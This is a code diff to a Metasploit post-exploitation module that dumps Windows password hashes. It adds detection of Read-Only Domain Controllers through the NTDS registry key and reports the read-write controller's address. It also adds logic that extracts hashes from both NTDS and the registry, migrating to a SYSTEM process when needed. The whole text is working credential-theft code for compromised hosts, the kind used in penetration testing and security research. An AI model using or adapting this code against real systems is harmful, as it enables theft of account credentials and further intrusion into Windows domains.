@@ -335,6 +335,20 @@ class Metasploit3 < Msf::Post
   end
   #-------------------------------------------------------------------------------
 
+  # Function for checking if target is a RODC
+  def is_rodc?
+    is_rodc_srv = false
+    serviceskey = "HKLM\\SYSTEM\\CurrentControlSet\\Services\\NTDS\\Parameters"
+    if registry_enumvals(serviceskey).include?("Src Root Domain Srv")
+		rwdc_fqdn = registry_getvaldata("HKLM\\SYSTEM\\CurrentControlSet\\Services\\NTDS\\Parameters", "Src Root Domain Srv")
+        print_good("\tThis host is a Read-Only Domain Controller!")
+        print_good("\tThe Read-Write Domain Controller can be found at #{rwdc_fqdn}")
+        is_rodc_srv = true
+    end
+    return is_rodc_srv
+  end
+  #-------------------------------------------------------------------------------
+
   # Function to migrate to a process running as SYSTEM
   def move_to_sys
     # Make sure you got the correct SYSTEM Account Name no matter the OS Language
@@ -364,13 +378,36 @@ class Metasploit3 < Msf::Post
   #-------------------------------------------------------------------------------
 
   def smart_hash_dump(migrate_system, pwdfile)
-    domain_controler = is_dc?
+    domain_controller = is_dc?
+	if domain_controller
+			read_only_domain_controller = is_rodc?
+	end
     if not is_uac_enabled? or is_admin?
       print_status("Dumping password hashes...")
       # Check if Running as SYSTEM
       if is_system?
         # For DC's the registry read method does not work.
-        if domain_controler
+		# For Read Only Domain Controllers NTDS does not typically contain hashes
+		# Will attempt to grab both the domain and local hashes 
+        if read_only_domain_controller
+			begin
+				print_status "Running as SYSTEM extracting hashes from NTDS"
+				file_local_write(pwdfile,inject_hashdump)
+				print_status "Running as SYSTEM extracting hashes from registry"
+				file_local_write(pwdfile,read_hashdump)
+			rescue::Exception => e
+				print_error("Failed to dump hashes as SYSTEM, trying to migrate to another process")
+
+				if sysinfo['OS'] =~ /Windows (2008|2012)/i
+					move_to_sys
+					file_local_write(pwdfile,inject_hashdump)
+				else
+					print_error("Could not get NTDS hashes!")
+				end
+			end
+
+		# For DC's the registry read method does not work.
+		elsif domain_controller
           begin
             file_local_write(pwdfile,inject_hashdump)
           rescue::Exception => e
@@ -394,7 +431,7 @@ class Metasploit3 < Msf::Post
       else
 
         # Check if Domain Controller
-        if domain_controler
+        if domain_controller
           begin
             file_local_write(pwdfile,inject_hashdump)
           rescue
